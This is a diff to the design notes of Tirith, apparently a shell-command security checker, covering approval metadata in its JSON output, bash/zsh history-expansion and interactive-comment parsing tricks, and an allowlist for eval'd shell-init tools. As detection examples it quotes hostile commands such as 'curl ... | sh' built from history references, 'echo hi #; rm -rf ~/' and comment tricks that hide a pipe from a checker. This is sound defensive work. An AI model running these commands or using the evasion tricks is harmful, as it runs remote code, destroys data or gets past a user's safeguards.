@@ -211,11 +211,32 @@ receipts already require redacted inputs before hashing/signing.
 
 ### Compatibility decision
 
-Command-check JSON defaults to the frozen schema-3 contract. Callers explicitly
+Command-check JSON defaults to schema 3. Callers explicitly
 select `tirith check --format json --json-schema 4` to include typed recovery
 advice. Both versions retain the same action and exit code. Schema selection is
 rejected without JSON output and cannot be combined with approval checks or
 execution receipts. `tirith commands check` keeps its existing schema-3 output.
+
+The 0.5.0 execution contract adds an always-present `requires_approval` boolean
+to both versions. It is true for an active approval-rule gate, `WarnAck`, or a
+strict-warning acknowledgement required by the CLI flag/effective policy.
+`strict_warn` does not rewrite a standalone non-interactive Warn or its exit 2;
+the metadata tells execution consumers that confirmation is required. Optional
+`approval_timeout_secs`, `approval_fallback`, `approval_rule` and redacted
+`approval_description` are emitted only for the active approval-rule gate.
+
+Execution adapters must test confirmation before ordinary warning filtering or
+warning-allow handling. Hermes asks through its native gate; installed hosts
+without an approval contract deny. Known `WarnAck`/exit 3 cannot fall through
+checker fail-open even when JSON is damaged. The new adapters refuse or report a
+checker failure for absent/non-boolean approval metadata, rather than treating an
+older unsupported response as false. Report-only older schema readers can ignore
+the additive fields. Action and process-exit semantics remain unchanged.
+
+The writer's contextual acknowledgement argument avoids cloning/mutating the
+enforcement verdict. Confirmation survives content redaction and oversized
+fallback envelopes; canonical rule/fallback values remain machine metadata,
+while the description receives normal content projection.
 
 This correction preserves current field names, serialized enum spellings,
 optional fields, stdout/stderr routing and process exits. It repairs corruption
@@ -353,6 +374,132 @@ the expansion cannot run with the inherited value. State the command cannot
 show, such as live aliases, functions or variable attributes like
 `typeset -u`, is outside the analysis, exactly as it is for a literal command
 name.
+
+An interactive bash or zsh rewrites history references before it parses the
+line, so `true sh; curl https://example-cli.dev/x | !#:1` runs
+`curl https://example-cli.dev/x | sh`. Input that a POSIX shell's interactive
+hook or paste widget sends (`tirith check --interactive`,
+`tirith paste --interactive`) is therefore checked for them, with the union of
+what bash 5, bash 3.2 and zsh expand: nothing inside single quotes or `$'...'`,
+after a backslash or in a heredoc body, and no `!` followed by a blank, `=`,
+`(`, `;`, a quote or the end of the line. A reference ends before the next `!`,
+which starts a reference of its own (`!$!#:1` is `!$` and then `!#:1`). These
+are reported as `analysis_incomplete`: `!#` (words of the line being typed,
+also glued after another reference and in zsh's `!{#...}` form), `^old^new`
+at the start of a line, a `!` reference on a later line of a multi-line paste
+(bash expands each pasted line after running the ones before it, so the
+reference can copy words of an earlier pasted line), and a reference used
+where a command is formed, which is treated exactly as an unresolved `$X`
+there (a command name, a pipe sink, the body of `sh -c`, `eval`, `exec`,
+`xargs`: `curl ... | !!:1`, `bash -c "!!"`, `!!:s/echo/sh/`). zsh also deletes
+the first live `!"`, unquoted or inside double quotes. That usually leaves the
+line unterminated and zsh only prompts for more (`echo "hi!"`), but a `\'` can
+bring the quote readings back together (`echo "x!" "; curl ... | sh ; '"'\'`
+runs the pipe in zsh), so a `!"` whose removal leaves balanced quotes is
+reported too. A plain re-run that is the whole command, optionally after
+`sudo` or `doas` and before output redirections (`!!`, `!-2`, `!git`,
+`sudo !!`, `!! > log`, and the print-only `!!:p`), and a reference used as an
+ordinary argument (`cd !$`, `vim !$`, `git add !*`, `echo "wow!!"`) are not
+reported. The re-run exemption relies on the earlier command having been
+checked when it ran, so the builtins that put text into history without
+running it are reported: zsh `print -s` / `print -S`, bash `history -s`, zsh
+`fc -R` and `fc -p FILE`. A known limit remains when input reaches the shell
+one line at a time (typed lines, or a paste without bracketed paste): an
+argument-position reference such as `!:2` can copy an operator word (`|`, `;`)
+out of an earlier, separately checked line, which no single check can see.
+Agent integrations pass `--non-interactive` and run commands in shells that
+never expand history, `tirith score` analyzes its URL non-interactively, and
+fish, PowerShell and cmd have no `!` history expansion, so none of them get
+these findings. The bash hook's enter mode runs the checked text without
+history expansion, so there the findings are only conservative.
+
+An interactive zsh reads a word-start `#` as an ordinary word character unless
+`interactivecomments` is set, and it is unset by default, so
+`echo hi #; curl https://example-cli.dev/x | sh` prints `hi #` and runs the
+pipe. bash does the same after `shopt -u interactive_comments`. The bash and
+zsh hooks read the option at every check and paste and then set
+`_TIRITH_INTERACTIVE_COMMENTS=0` for `tirith check` and `tirith paste`
+(`--no-interactive-comments` says the same on the command line). They use the
+environment rather than the flag because a pinned binary older than the hooks
+ignores the variable and keeps its own protection, while 0.4.1 reads an
+unknown `check` flag before `--` as the start of the checked command (and
+allows `curl ... | sh`) and rejects one on `paste`. fish, PowerShell and cmd
+hooks never set it, and without it a word-start `#` starts a comment as
+before. For interactive POSIX exec and paste input read that way, Tirith also
+analyzes a copy of the input in which each such `#` is escaped (`\#`), and
+adds what that reading finds to the analysis of the input as typed, which it
+never replaces: `echo hi #; rm -rf ~/` blocks, while
+`git status # check`, `gh issue view #12` and a pasted script with comment
+lines stay allowed. A finding only that reading produced says so at the start
+of its description, and one both readings produce is reported once. The copy
+escapes exactly the `#`s the POSIX tokenizer reads as comment starts: outside
+quotes, `$'...'`, `${...}` and heredoc data, and never after a backslash, so
+`a#b`, `${x#y}`, `$#` and a quoted `#` are left alone. A `!` right after such
+a `#` is escaped too: zsh history-expands it into a word that starts with `#`
+(`#!/bin/bash` fails with `event not found`, or runs no program), so a pasted
+script's shebang line is not read as a command formed by history expansion.
+The copy goes through the same Tier-1 gate as any input, so a commented line
+whose copy is clean keeps the fast path. It is built from the whole input,
+`# tirith-card:` prelude included: with comments off a prelude line is a
+command line (`# tirith-card: x; curl ... | sh` runs the pipe), and in the copy
+it is no longer a prelude. A line-scoped `TIRITH=0` bypass must be eligible in
+the copy too, so `TIRITH=0 ls #; curl ... | sh` (two commands for that shell)
+is not bypassed, while `TIRITH=0 curl ... | bash # note` still is. Runtime
+threat enrichment (OSV, deps.dev, Safe Browsing) looks up the packages and URLs
+of both readings on every path that runs it (inline check, daemon, receipt
+consumption, suggestions, frozen evaluations). A nested shell that reads its script without comments gets
+the same extra reading for that body, whatever the outer shell does: an
+interactive zsh fed its script on stdin (`zsh -i <<< 'echo hi #; cmd'`, also
+`-o interactive` or `--interactive`, unless `-k` or `-o interactivecomments`;
+zsh recognises comments in a `-c` string and in a script file), and bash with
+`-i` and `+O interactive_comments`, on stdin or in its `-c` string. Without
+`-f` a startup file may turn zsh's option on, which only makes that reading
+conservative. Checked in a pty against
+zsh 5.9 (`zsh -f -i`) and bash 5.3: both shells read the line, `{ ...; }`,
+`( ... )`, `if`/`for`/`while` bodies, function bodies and `case` patterns
+without comments; zsh also reads `$(...)` and backtick bodies that way (also
+those in an unquoted heredoc body), while bash keeps comments there, so that
+part of the copy follows zsh and only adds findings for bash. Both shells parse
+`<(...)`, `>(...)` and zsh `=(...)` bodies as separate strings with comments,
+and `sh -c` strings and heredoc data are read by another program or not at
+all, so none of these are rewritten. A copy that does not settle (escaping a
+`#` can reveal a heredoc operator, which is re-read up to 32 times) or an input
+past 1 MiB is reported as `analysis_incomplete`. A shell execution receipt
+records the reading, and consumption re-analyzes the command with it. The bash
+preexec hook's whole-line drift check also takes such a `#` as a word while the
+option is off, so enforcement covers the command after it instead of degrading
+to warn-only. Known limits: bash with `interactive_comments` off also runs the
+text after a word-start `#` inside an `eval` string, which this reading does
+not model (zsh recognises comments there). In the bash preexec hook with
+enforcement that matters little today: any `eval` line already fails the
+whole-line drift check and drops the session to warn-only, with the option on
+or off, which is a separate, older gap. bash's enter mode delivers the
+accepted line with `eval` from its prompt hook, where bash recognised comments
+even with the option off in the same pty check, so there the findings are only
+conservative. A brace group followed by a `#` word (`{ a; b; } # note`) reads as
+an unresolved group in an exec check; both shells reject that line with a parse
+error, so nothing that would have run is blocked.
+
+`eval` or `source` of a generated script is normally an unresolved body. A
+short reviewed list of shell-init emitters is the exception, when the emitter
+runs with literal words only: `eval "$(brew shellenv)"` (also
+`/opt/homebrew/bin/brew` and the other system bin directories),
+`eval "$(direnv hook bash)"`, `eval "$(pyenv init -)"` / `--path`,
+`eval "$(rbenv init -)"`, `eval "$(ssh-agent -s)"` or `eval "$(ssh-agent)"`
+(also unquoted or with backticks), `eval "$(zoxide init zsh)"`,
+`eval "$(starship init bash)"`, `eval "$(fnm env)"`,
+`eval "$(mise activate bash)"`, `source <(kubectl completion zsh)` and
+`source <(fzf --zsh)`. The emitter itself is still analyzed as a command.
+Sending the `eval` or `source` output to `/dev/null` (`>/dev/null`,
+`1>/dev/null`, `2>/dev/null`, `&>/dev/null`, and `2>&1` once stdout already
+goes there) keeps the trust. A variable, an extra pipe, command or operand,
+any other redirection, a wrapper (`command eval`), an assignment prefix, a
+relative or non-system path (`./brew`, `/tmp/brew`), another subcommand, or
+anything in the input that can rebind the name (a function or alias
+definition, a `PATH`, `hash` or `IFS` change) keeps the unresolved-body block.
+So does a variable set or exported anywhere in the same input, including a
+`for`, `select` or `coproc` loop variable, because the emitters build their
+output from the environment (`TMPDIR`, `HOME`, `PYENV_ROOT`).
 
 A command word whose directory is a double-quoted parameter expansion and
 whose file name is literal (`"$VIRTUAL_ENV/bin/python" -m pytest`,
